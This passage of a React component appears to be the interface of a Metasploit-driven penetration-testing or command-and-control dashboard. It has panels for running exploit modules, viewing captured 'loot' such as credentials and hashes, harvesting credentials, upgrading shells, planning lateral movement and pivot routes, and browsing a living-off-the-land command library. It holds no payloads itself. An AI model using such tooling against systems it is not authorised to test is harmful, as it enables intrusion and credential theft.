                          bg-red-900/40 hover:bg-red-800/60 text-red-300 border border-red-700/30 hover:border-red-600/50"
                        title={!msfStatus.connected ? 'Connect to Metasploit first' : 'Run this module'}
                      >
                        {runningModule === i
                          ? <><RefreshCw size={11} className="animate-spin" /> Running...</>
                          : <><Play size={11} /> Run</>
                        }
                      </button>
                      {moduleResults[i] && (
                        moduleResults[i].error ? (
                          <span className="text-xs text-red-400">{moduleResults[i].error}</span>
                        ) : moduleResults[i].new_session_id ? (
                          <span className="text-xs text-green-400 flex items-center gap-1">
                            <span className="relative flex h-2 w-2">
                              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75" />
                              <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500" />
                            </span>
                            Session opened (MSF #{moduleResults[i].new_session_id})
                          </span>
                        ) : moduleResults[i].timed_out ? (
                          <span className="flex items-center gap-2 flex-wrap">
                            <span className="text-xs text-red-400">
                              No callback received — job{moduleResults[i].job_id ? ` #${moduleResults[i].job_id}` : ''} timed out
                            </span>
                            <button
                              onClick={handleSync}
                              className="text-[10px] text-cyan-400 hover:text-cyan-300 underline underline-offset-2"
                            >
                              Sync sessions
                            </button>
                          </span>
                        ) : (
                          <span className="flex items-center gap-2 flex-wrap">
                            <span className="text-xs text-amber-400">
                              {rec.module.startsWith('auxiliary/')
                                ? `Scan running${moduleResults[i].job_id ? ` (#${moduleResults[i].job_id})` : ''}…`
                                : `Job started${moduleResults[i].job_id ? ` (#${moduleResults[i].job_id})` : ''} — waiting for callback`
                              }
                            </span>
                            {!rec.module.startsWith('auxiliary/') && (
                              <button
                                onClick={handleSync}
                                className="text-[10px] text-cyan-400 hover:text-cyan-300 underline underline-offset-2"
                              >
                                Sync sessions
                              </button>
                            )}
                          </span>
                        )
                      )}
                    </div>
                    {moduleResults[i]?.msf_result && (
                      <pre className="text-[10px] font-mono text-slate-500 bg-[#05080d] rounded px-2 py-1.5 border border-cyan-900/20 overflow-x-auto">
                        {JSON.stringify(moduleResults[i].msf_result, null, 2)}
                      </pre>
                    )}
                    </div>
                  )}
                </div>
              )
            })}

            {attackPlan && attackPlan.unmatched_findings.length > 0 && (
              <div className="glass rounded-xl border border-cyan-900/10 p-4 flex-shrink-0">
                <p className="text-[10px] text-slate-600 uppercase tracking-wider mb-2">No module match found for:</p>
                <div className="space-y-1">
                  {attackPlan.unmatched_findings.map((f, i) => (
                    <div key={i} className="text-xs text-slate-600 flex items-center gap-2">
                      <span className="w-1.5 h-1.5 rounded-full bg-slate-700 flex-shrink-0" />
                      {f.title}
                      {f.cve_id && <span className="font-mono text-slate-700">{f.cve_id}</span>}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {!attackPlan && !generatingAttack && (
              <div className="flex-1 glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center text-slate-600 py-16">
                <Crosshair size={40} className="mb-3 opacity-20 text-red-600" />
                <p className="text-sm">Select a project and click Analyze</p>
                <p className="text-xs mt-1 text-slate-700">Works best after running nmap and nikto scans</p>
              </div>
            )}
          </div>
        )}

        {/* Loot tab */}
        {activeTab === 'loot' && (
          <div className="flex-1 overflow-y-auto space-y-3">
            {loot.length === 0 ? (
              <div className="glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center py-16 text-slate-600">
                <Database size={40} className="mb-3 opacity-20 text-amber-600" />
                <p className="text-sm">No loot captured yet</p>
                <p className="text-xs mt-1 text-slate-700">Run post-exploitation modules to capture credentials, hashes, and files</p>
              </div>
            ) : loot.map(item => (
              <div key={item.id} className="glass glass-hover rounded-xl border border-cyan-900/20 p-4">
                <div className="flex items-start gap-3">
                  <span className={`text-xs px-2 py-0.5 rounded border font-semibold uppercase flex-shrink-0 ${LOOT_COLORS[item.loot_type] || LOOT_COLORS.system_info}`}>
                    {item.loot_type}
                  </span>
                  <div className="flex-1 min-w-0">
                    <div className="text-sm text-slate-200 font-medium">{item.title}</div>
                    {item.source_path && <div className="text-xs text-slate-500 font-mono mt-0.5">{item.source_path}</div>}
                    <div className="text-xs text-slate-600 mt-0.5">{new Date(item.captured_at).toLocaleString()}</div>
                  </div>
                  <div className="flex gap-1 flex-shrink-0">
                    {item.content && (
                      <>
                        <button onClick={() => copyText(item.content, item.id)} className="text-slate-600 hover:text-cyan-400 transition-colors p-1">
                          {copied === item.id ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
                        </button>
                        <button onClick={() => setShowLootContent(showLootContent === item.id ? null : item.id)} className="text-slate-600 hover:text-cyan-400 transition-colors p-1">
                          {showLootContent === item.id ? <EyeOff size={13} /> : <Eye size={13} />}
                        </button>
                      </>
                    )}
                    <button onClick={async () => { await fetch(`/api/v1/c2/loot/${item.id}`, { method: 'DELETE' }); loadLoot() }} className="text-slate-600 hover:text-red-400 transition-colors p-1">
                      <Trash2 size={13} />
                    </button>
                  </div>
                </div>
                {showLootContent === item.id && item.content && (
                  <pre className="mt-3 bg-[#05080d] rounded-lg p-3 text-xs font-mono text-slate-300 overflow-x-auto whitespace-pre-wrap border border-cyan-900/20 max-h-40 overflow-y-auto">
                    {item.content}
                  </pre>
                )}
              </div>
            ))}
          </div>
        )}
        {/* Post-Ex tab */}
        {activeTab === 'postex' && (
          <div className="flex-1 overflow-y-auto space-y-4">
            {!activeSession ? (
              <div className="glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center py-16 text-slate-600">
                <ListChecks size={36} className="mb-3 opacity-20" />
                <p className="text-sm">Select a session to view post-exploitation tools</p>
              </div>
            ) : (
              <>
                {/* Quick actions */}
                <div className="glass rounded-xl p-4 border border-cyan-900/20">
                  <h3 className="text-sm font-semibold text-slate-200 mb-3 flex items-center gap-2">
                    <Zap size={14} className="text-amber-400" /> Quick Actions
                    <span className="ml-2 text-xs font-normal text-slate-500 font-mono">{activeSession.remote_host} · {activeSession.session_type}</span>
                  </h3>
                  <div className="flex flex-wrap gap-2">
                    <button
                      onClick={handleAutoprobe}
                      disabled={probing}
                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyan-900/30 hover:bg-cyan-800/40 border border-cyan-700/30 text-xs text-cyan-300 transition-all disabled:opacity-50"
                    >
                      <RefreshCw size={12} className={probing ? 'animate-spin' : ''} />
                      {probing ? 'Probing…' : 'Auto-Probe'}
                    </button>
                    <button
                      onClick={handleHarvestCreds}
                      disabled={harvesting}
                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-amber-900/30 hover:bg-amber-800/40 border border-amber-700/30 text-xs text-amber-300 transition-all disabled:opacity-50"
                    >
                      {harvesting ? <RefreshCw size={12} className="animate-spin" /> : <KeyRound size={12} />}
                      Harvest Creds
                    </button>
                    <button
                      onClick={handleScreenshot}
                      disabled={screenshotting || !activeSession.session_type.includes('meterpreter')}
                      title={!activeSession.session_type.includes('meterpreter') ? 'Requires Meterpreter' : ''}
                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-blue-900/30 hover:bg-blue-800/40 border border-blue-700/30 text-xs text-blue-300 transition-all disabled:opacity-40"
                    >
                      {screenshotting ? <RefreshCw size={12} className="animate-spin" /> : <Camera size={12} />}
                      Screenshot
                    </button>
                    <button
                      onClick={handleUpgrade}
                      disabled={upgrading || activeSession.session_type.includes('meterpreter')}
                      title={activeSession.session_type.includes('meterpreter') ? 'Already Meterpreter' : 'Upgrade shell → Meterpreter'}
                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-purple-900/30 hover:bg-purple-800/40 border border-purple-700/30 text-xs text-purple-300 transition-all disabled:opacity-40"
                    >
                      {upgrading ? <RefreshCw size={12} className="animate-spin" /> : <ArrowUpCircle size={12} />}
                      Upgrade Shell
                    </button>
                  </div>

                  {/* Action output */}
                  {(probeOutput || harvestOutput || upgradeOutput || screenshotResult) && (
                    <pre className="mt-3 bg-[#05080d] rounded-lg p-3 text-xs font-mono text-slate-300 whitespace-pre-wrap border border-cyan-900/20 max-h-40 overflow-y-auto">
                      {probeOutput || harvestOutput || upgradeOutput || screenshotResult}
                    </pre>
                  )}
                </div>

                {/* Parse Sysinfo */}
                <div className="glass rounded-xl overflow-hidden border border-cyan-900/20">
                  <div className="px-4 py-3 border-b border-cyan-900/20 flex items-center justify-between">
                    <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                      <Shield size={13} /> Parse Sysinfo
                    </span>
                    {activeSession.sysinfo?.hostname && (
                      <span className="text-[10px] font-mono text-cyan-400 truncate max-w-[120px]">
                        {activeSession.sysinfo.hostname}
                      </span>
                    )}
                  </div>
                  <div className="p-3 space-y-2">
                    {activeSession.sysinfo ? (
                      <div className="grid grid-cols-2 gap-x-3 gap-y-1 text-[11px] font-mono">
                        {([
                          ['hostname', activeSession.sysinfo.hostname, 'text-cyan-300'],
                          ['os',       activeSession.sysinfo.os,       'text-slate-300'],
                          ['arch',     activeSession.sysinfo.arch,     'text-slate-300'],
                          ['user',     activeSession.sysinfo.username, 'text-green-300'],
                          ['domain',   activeSession.sysinfo.domain,   'text-purple-300'],
                        ] as [string, string | null, string][]).filter(([, v]) => v).map(([k, v, cls]) => (
                          <div key={k} className="flex gap-1.5 col-span-2">
                            <span className="text-slate-600 w-14 flex-shrink-0">{k}</span>
                            <span className={`${cls} truncate`} title={v!}>{v}</span>
                          </div>
                        ))}
                        {activeSession.sysinfo.is_admin !== null && (
                          <div className="flex gap-1.5 col-span-2">
                            <span className="text-slate-600 w-14 flex-shrink-0">admin</span>
                            <span className={activeSession.sysinfo.is_admin ? 'text-yellow-400 font-bold' : 'text-slate-500'}>
                              {activeSession.sysinfo.is_admin ? 'YES' : 'no'}
                            </span>
                          </div>
                        )}
                      </div>
                    ) : (
                      <p className="text-[11px] text-slate-600">No sysinfo parsed yet. Paste command output below.</p>
                    )}
                    <textarea
                      value={sysinfoRaw}
                      onChange={e => setSysinfoRaw(e.target.value)}
                      placeholder="Paste sysinfo / systeminfo / uname -a output here…"
                      className="w-full bg-[#05080d] border border-cyan-900/30 rounded px-2 py-1.5 text-[11px] font-mono text-slate-300 focus:outline-none focus:border-cyan-500/50 resize-none"
                      rows={4}
                    />
                    <button
                      onClick={handleParseSysinfo}
                      disabled={parsingSysinfo || !sysinfoRaw.trim()}
                      className="w-full py-1.5 rounded-lg bg-cyan-900/40 hover:bg-cyan-800/50 border border-cyan-700/30 text-xs text-cyan-300 transition-all disabled:opacity-40 flex items-center justify-center gap-1.5"
                    >
                      {parsingSysinfo ? <RefreshCw size={11} className="animate-spin" /> : <Shield size={11} />}
                      Parse & Save
                    </button>
                  </div>
                </div>

                {/* Checklist */}
                <div className="glass rounded-xl overflow-hidden border border-cyan-900/20">
                  <div className="px-4 py-3 border-b border-cyan-900/20 flex items-center justify-between">
                    <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                      <ListChecks size={13} /> Post-Ex Checklist
                    </span>
                    <div className="flex items-center gap-3">
                      <span className="text-xs text-slate-600">
                        {checklist.filter(i => i.done).length}/{checklist.length} done
                      </span>
                      <button
                        onClick={async () => {
                          if (!activeSession) return
                          const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/checklist/reset`, { method: 'POST' })
                          if (res.ok) setChecklist(await res.json())
                        }}
                        className="text-[11px] text-slate-600 hover:text-amber-400 transition-colors"
                        title="Reset checklist"
                      >
                        Reset
                      </button>
                    </div>
                  </div>
                  {(['recon', 'creds', 'escalation', 'evidence', 'persistence', 'lateral'] as const).map(cat => {
                    const items = checklist.filter(i => i.category === cat)
                    if (!items.length) return null
                    const catLabels: Record<string, string> = {
                      recon: 'Recon', creds: 'Credentials', escalation: 'Escalation',
                      evidence: 'Evidence', persistence: 'Persistence', lateral: 'Lateral Movement',
                    }
                    return (
                      <div key={cat} className="border-b border-cyan-900/10 last:border-0">
                        <div className="px-4 py-1.5 bg-cyan-950/10 text-[10px] font-semibold text-slate-500 uppercase tracking-wider">
                          {catLabels[cat]}
                        </div>
                        {items.map(item => (
                          <label key={item.id} className="flex items-center gap-3 px-4 py-2.5 hover:bg-cyan-950/10 cursor-pointer transition-colors">
                            <input
                              type="checkbox"
                              checked={item.done}
                              onChange={e => toggleChecklistItem(item.id, e.target.checked)}
                              className="w-3.5 h-3.5 accent-cyan-500 cursor-pointer flex-shrink-0"
                            />
                            <span className={`text-xs transition-colors ${item.done ? 'line-through text-slate-600' : 'text-slate-300'}`}>
                              {item.label}
                            </span>
                            {item.done && item.done_at && (
                              <span className="ml-auto text-[10px] text-slate-600 flex-shrink-0">
                                {new Date(item.done_at).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'})}
                              </span>
                            )}
                          </label>
                        ))}
                      </div>
                    )
                  })}
                </div>

                {/* Pivot Routes */}
                {/* Lateral Movement Discovery */}
                <div className="glass rounded-xl overflow-hidden border border-amber-900/20">
                  <div className="px-4 py-3 border-b border-amber-900/20 flex items-center justify-between">
                    <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                      <Network size={13} className="text-amber-400" /> Lateral Movement
                    </span>
                    <button
                      onClick={handleLateralDiscover}
                      disabled={discoveringLateral}
                      className="flex items-center gap-1 px-2 py-1 rounded bg-amber-900/30 hover:bg-amber-800/40 border border-amber-700/20 text-[10px] text-amber-300 transition-all disabled:opacity-40"
                    >
                      {discoveringLateral ? <RefreshCw size={10} className="animate-spin" /> : <Zap size={10} />}
                      {lateralResult ? 'Re-Analyse' : 'Analyse'}
                    </button>
                  </div>

                  {lateralResult ? (
                    <div className="p-3 space-y-3 text-xs">
                      {/* Subnets */}
                      <div>
                        <div className="text-[10px] text-slate-600 uppercase tracking-wider mb-1">Adjacent Subnets</div>
                        <div className="flex flex-wrap gap-1.5">
                          {lateralResult.subnets.map(s => (
                            <button
                              key={s}
                              onClick={() => setNewRouteSubnet(s.split('/')[0])}
                              className="font-mono text-[10px] px-1.5 py-0.5 rounded bg-amber-950/30 border border-amber-700/20 text-amber-300 hover:border-amber-500/40 transition-colors"
                              title="Click to prefill route"
                            >
                              {s}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Techniques */}
                      <div>
                        <div className="text-[10px] text-slate-600 uppercase tracking-wider mb-1">
                          Techniques ({lateralResult.cred_types_available.length > 0 ? lateralResult.cred_types_available.join(', ') : 'no creds'})
                        </div>
                        <div className="space-y-1.5">
                          {lateralResult.techniques.map(t => (
                            <div key={t.id} className="flex items-start gap-2 p-2 rounded-lg bg-amber-950/20 border border-amber-900/20">
                              <Crosshair size={10} className="text-amber-400 flex-shrink-0 mt-0.5" />
                              <div className="flex-1 min-w-0">
                                <div className="font-medium text-slate-200">{t.label}</div>
                                <div className="text-[10px] text-slate-500 mt-0.5">{t.description}</div>
                                {t.msf_module && (
                                  <div className="flex items-center gap-1 mt-1">
                                    <code className="text-[9px] font-mono text-amber-300/80">{t.msf_module}</code>
                                    <button
                                      onClick={() => navigator.clipboard.writeText(t.msf_module!)}
                                      className="text-slate-700 hover:text-amber-400 transition-colors"
                                    >
                                      <Copy size={9} />
                                    </button>
                                  </div>
                                )}
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Discovery modules */}
                      <div>
                        <div className="text-[10px] text-slate-600 uppercase tracking-wider mb-1">Discovery Modules</div>
                        {lateralResult.discovery_modules.map(m => (
                          <div key={m.name} className="flex items-center gap-2 py-1 border-b border-amber-900/10">
                            <code className="text-[9px] font-mono text-slate-400 flex-1 truncate">{m.name}</code>
                            <button onClick={() => navigator.clipboard.writeText(m.name)} className="text-slate-700 hover:text-amber-400 transition-colors flex-shrink-0">
                              <Copy size={9} />
                            </button>
                          </div>
                        ))}
                      </div>
                    </div>
                  ) : (
                    <div className="px-4 py-5 text-center text-[11px] text-slate-600">
                      Click Analyse to discover pivot paths and lateral movement opportunities.
                    </div>
                  )}
                </div>

                <div className="glass rounded-xl overflow-hidden border border-cyan-900/20">
                  <div className="px-4 py-3 border-b border-cyan-900/20 flex items-center gap-2">
                    <Network size={13} className="text-cyan-400" />
                    <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Pivot Routes</span>
                    {pivotRoutes.length > 0 && <span className="text-xs text-cyan-400 ml-1">({pivotRoutes.length})</span>}
                  </div>

                  {/* Add route form */}
                  <div className="p-4 border-b border-cyan-900/10">
                    <div className="flex gap-2 items-end">
                      <div className="flex-1">
                        <label className="text-[10px] text-slate-500 mb-1 block">Subnet</label>
                        <input
                          value={newRouteSubnet}
                          onChange={e => setNewRouteSubnet(e.target.value)}
                          placeholder="10.10.10.0"
                          className={inputClass}
                        />
                      </div>
                      <div className="w-40">
                        <label className="text-[10px] text-slate-500 mb-1 block">Netmask</label>
                        <input
                          value={newRouteNetmask}
                          onChange={e => setNewRouteNetmask(e.target.value)}
                          placeholder="255.255.255.0"
                          className={inputClass}
                        />
                      </div>
                      <button
                        onClick={handleAddRoute}
                        disabled={addingRoute || !newRouteSubnet}
                        className="px-4 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 disabled:opacity-40 text-sm text-white transition-all flex-shrink-0"
                      >
                        {addingRoute ? <RefreshCw size={14} className="animate-spin" /> : 'Add'}
                      </button>
                    </div>
                  </div>

                  {pivotRoutes.length === 0 ? (
                    <div className="text-center text-slate-600 py-6 text-xs">No pivot routes added</div>
                  ) : (
                    <div className="divide-y divide-cyan-900/10">
                      {pivotRoutes.map(r => (
                        <div key={r.id} className="flex items-center gap-3 px-4 py-2.5 hover:bg-cyan-950/10">
                          <span className="w-2 h-2 rounded-full bg-green-500 flex-shrink-0" />
                          <code className="flex-1 text-xs font-mono text-slate-300">{r.subnet}/{r.netmask}</code>
                          <span className="text-[10px] text-slate-600 mr-2">via session {r.session_id}</span>
                          <button onClick={() => handleRemoveRoute(r.id)} className="text-slate-600 hover:text-red-400 transition-colors">
                            <X size={13} />
                          </button>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </>
            )}
          </div>
        )}

        {/* LOTL tab */}
        {activeTab === 'lotl' && (
          <div className="flex-1 overflow-y-auto">
            <div className="glass rounded-xl p-4 border border-cyan-900/20 mb-4">
              <div className="flex items-center gap-3 flex-wrap">
                <h3 className="text-sm font-semibold text-slate-200 flex items-center gap-2">
                  <BookOpen size={14} className="text-cyan-400" /> Living-off-the-Land Command Library
                </h3>
                <input
                  className="flex-1 min-w-[160px] bg-[#05080d] border border-cyan-900/30 rounded-lg px-3 py-1 text-xs text-slate-300 outline-none focus:border-cyan-500/50"
                  placeholder="Search commands..."
                  value={lotlSearch}
                  onChange={e => setLotlSearch(e.target.value)}
                />
                <div className="flex gap-1">
                  {(['all', 'linux', 'windows'] as const).map(f => (
                    <button key={f} onClick={() => setLotlFilter(f)}
                      className={`px-2.5 py-1 rounded text-xs transition-all ${lotlFilter === f ? 'bg-cyan-600 text-white' : 'text-slate-400 hover:text-slate-200'}`}>
                      {f === 'all' ? 'All' : f === 'linux' ? '🐧 Linux' : '🪟 Windows'}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            {lotlLib.length === 0 ? (
              <div className="text-slate-600 text-sm text-center py-12">Loading...</div>
            ) : lotlLib.map(cat => {
              const cmds = cat.commands.filter(c => {
                if (lotlFilter !== 'all' && c.platform !== lotlFilter) return false
                if (lotlSearch) {
                  const q = lotlSearch.toLowerCase()
                  return c.label.toLowerCase().includes(q) || c.cmd.toLowerCase().includes(q) || c.mitre.toLowerCase().includes(q) || c.notes.toLowerCase().includes(q)
                }
                return true
              })
              if (cmds.length === 0) return null
              return (
                <div key={cat.id} className="glass rounded-xl border border-cyan-900/20 mb-4 overflow-hidden">
                  <div className="px-4 py-2 border-b border-cyan-900/20 bg-cyan-950/20">
                    <span className="text-xs font-semibold text-cyan-300">{cat.label}</span>
                  </div>
                  <div className="divide-y divide-cyan-900/10">
                    {cmds.map(cmd => (
                      <div key={cmd.id} className="p-3 hover:bg-cyan-950/10 group">
                        <div className="flex items-start justify-between gap-2 mb-1">
                          <div className="flex items-center gap-2">
                            <span className={`text-[9px] px-1.5 py-0.5 rounded font-mono ${cmd.platform === 'linux' ? 'bg-green-900/40 text-green-400' : 'bg-blue-900/40 text-blue-400'}`}>
                              {cmd.platform}
                            </span>
                            <span className="text-xs text-slate-300 font-medium">{cmd.label}</span>
                          </div>
                          <div className="flex items-center gap-2 flex-shrink-0">
                            <span className="text-[10px] text-amber-500/70 font-mono">{cmd.mitre}</span>
                            <button
                              onClick={() => { navigator.clipboard.writeText(cmd.cmd); setLotlCopied(cmd.id); setTimeout(() => setLotlCopied(''), 2000) }}
                              className="opacity-0 group-hover:opacity-100 transition-opacity text-slate-400 hover:text-cyan-400"
                              title="Copy command"
                            >
                              {lotlCopied === cmd.id ? <Check size={12} className="text-green-400" /> : <Copy size={12} />}
                            </button>
                          </div>
                        </div>
                        <pre className="text-[10px] text-cyan-300/80 font-mono bg-[#05080d] rounded px-2 py-1.5 overflow-x-auto mb-1 whitespace-pre-wrap break-all">{cmd.cmd}</pre>
                        <p className="text-[10px] text-slate-500">{cmd.notes}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )
            })}
          </div>
        )}

      </div>
    </div>
  )
}
